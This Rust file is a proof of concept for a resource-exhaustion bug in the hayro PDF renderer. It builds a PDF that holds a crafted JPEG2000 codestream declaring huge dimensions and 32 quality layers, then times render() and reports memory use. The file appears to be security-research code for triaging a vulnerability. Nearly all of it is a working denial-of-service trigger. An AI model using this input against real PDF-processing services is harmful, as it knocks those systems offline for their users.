// Standalone reproduction for candidate 012: does `segment::parse`'s own packet-header-parsing
// loop (walking every resolution level's packets, including skipped ones, once per layer) add a
// *separate*, meaningful cost on top of candidate 011's already-confirmed `build_decompositions`
// structural-build cost - decoupled from candidate 011's own `MAX_RAW_CODE_BLOCK_ESTIMATE` cap
// (which only estimates a single, layer-independent code-block *count*)?
//
// This drives a real, on-disk-shaped PDF (classic xref table, real `/JPXDecode` image XObject,
// placed small - `cm 20 0 0 20 90 90` on a 200x200 page - so the real, unmodified, top-level
// `hayro::render()` computes a small CTM-derived downscale hint) through the real, public
// `hayro::render()` entry point - the same function `hayro/examples/render.rs` itself calls.
//
// The embedded JPEG2000 codestream (`malicious.j2c`, 144 bytes) is a real, from-scratch,
// legitimately-parseable raw J2C codestream (SOC/SIZ/COD/QCD/SOT/SOD) declaring a raw size of
// 15000x15000 (same as candidate 011's own PoC), a single decomposition level (2 resolution
// levels total), the smallest legal code-block size (4x4), and - unlike candidate 011's PoC,
// which used an empty (0-byte) tile-part body and therefore never actually exercised
// `segment::parse`'s packet loop at all - the maximum legal number of quality layers (32) with a
// genuine, minimal, but structurally real packet-header bitstream: one zero-length packet per
// layer for the small (decoded) resolution level, and one non-zero-length packet per layer for
// the huge (skipped) raw resolution level, whose header bits are just enough (4 bits, 1 byte) to
// signal every code-block in every sub-band as "not yet included" via each sub-band's inclusion
// tag-tree root - the cheapest possible real packet, by design, to isolate the *iteration* cost
// of walking millions of code-blocks once per layer from any additional entropy-coded payload
// cost. The PDF byte stream is the genuine external/adversarial input; nothing about the trigger
// path is faked or hand-simulated.
//
// Exit code convention: 0 = ran to completion (prints elapsed time and peak RSS either way -
// "reproduced" is judged by the printed numbers, not a crash/abort, since this is a DoS-via-cost
// finding, not a crash).

use hayro::hayro_interpret::InterpreterSettings;
use hayro::hayro_syntax::Pdf;
use hayro::{RenderCache, RenderSettings, render};
use std::time::Instant;

const JP2C: &[u8] = include_bytes!("malicious.j2c");

fn build_poc_pdf() -> Vec<u8> {
    let mut img_dict = format!(
        "<< /Type /XObject /Subtype /Image /Width 15000 /Height 15000 \
/BitsPerComponent 8 /ColorSpace /DeviceGray /Filter /JPXDecode /Length {} >>",
        JP2C.len()
    )
    .into_bytes();
    let mut obj4 = Vec::new();
    obj4.append(&mut img_dict);
    obj4.extend_from_slice(b"\nstream\n");
    obj4.extend_from_slice(JP2C);
    obj4.extend_from_slice(b"\nendstream");

    // Placed *small* on the page (20x20 out of a 200x200 page) so that hayro's own
    // CTM-derived downscale hint requests a small target resolution - the point being that
    // even though the *decoder* is asked for a tiny image, the codestream's raw declared
    // dimensions (independent of the hint) still drive the vulnerable code path.
    let content: &[u8] = b"q 20 0 0 20 90 90 cm /Im0 Do Q";
    let mut obj5 = format!("<< /Length {} >>\nstream\n", content.len()).into_bytes();
    obj5.extend_from_slice(content);
    obj5.extend_from_slice(b"\nendstream");

    let objs: Vec<Vec<u8>> = vec![
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>".to_vec(),
        obj4,
        obj5,
    ];

    let mut out = Vec::new();
    out.extend_from_slice(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");

    let mut offsets = Vec::new();
    for (i, obj) in objs.iter().enumerate() {
        offsets.push(out.len());
        out.extend_from_slice(format!("{} 0 obj\n", i + 1).as_bytes());
        out.extend_from_slice(obj);
        out.extend_from_slice(b"\nendobj\n");
    }

    let xref_offset = out.len();
    let n = objs.len() + 1;
    out.extend_from_slice(format!("xref\n0 {n}\n").as_bytes());
    out.extend_from_slice(b"0000000000 65535 f \n");
    for off in &offsets {
        out.extend_from_slice(format!("{off:010} 00000 n \n").as_bytes());
    }
    out.extend_from_slice(format!("trailer\n<< /Size {n} /Root 1 0 R >>\n").as_bytes());
    out.extend_from_slice(format!("startxref\n{xref_offset}\n%%EOF").as_bytes());

    out
}

fn peak_rss_kb() -> Option<u64> {
    let status = std::fs::read_to_string("/proc/self/status").ok()?;
    for line in status.lines() {
        if let Some(rest) = line.strip_prefix("VmHWM:") {
            return rest.trim().trim_end_matches(" kB").trim().parse().ok();
        }
    }
    None
}

fn main() {
    let pdf_bytes = build_poc_pdf();
    println!(
        "built PoC PDF: {} bytes (embedded JPEG2000 codestream: {} bytes, declares \
15000x15000 raw, 1 decomposition level, 4x4 code blocks, 32 quality layers with a real, minimal \
non-empty packet stream; placed as a 20x20 thumbnail via `cm 20 0 0 20 90 90` on a 200x200 page)",
        pdf_bytes.len(),
        JP2C.len()
    );

    let pdf = Pdf::new(pdf_bytes).expect("PoC PDF should parse");
    let page = &pdf.pages()[0];

    let interpreter_settings = InterpreterSettings::default();
    let render_settings = RenderSettings::default();
    let cache = RenderCache::new();

    println!("calling the real, public hayro::render() and timing it...");

    let start = Instant::now();
    let pixmap = render(page, &cache, &interpreter_settings, &render_settings);
    let elapsed = start.elapsed();

    println!(
        "render() returned after {:?} (pixmap {}x{})",
        elapsed,
        pixmap.width(),
        pixmap.height()
    );

    if let Some(kb) = peak_rss_kb() {
        println!("peak RSS (VmHWM): {kb} kB (~{:.2} MB)", kb as f64 / 1024.0);
    }

    if elapsed.as_millis() >= 500 {
        println!(
            "SLOW: took >= 500ms to render a 20x20 thumbnail placement - consistent with the \
suspected packet-header-parsing-loop cost (multiplied by the 32 quality layers), on top of \
candidate 011's own already-confirmed raw-dimension-driven structural-build cost"
        );
    } else {
        println!("FAST: rendering completed quickly");
    }
}
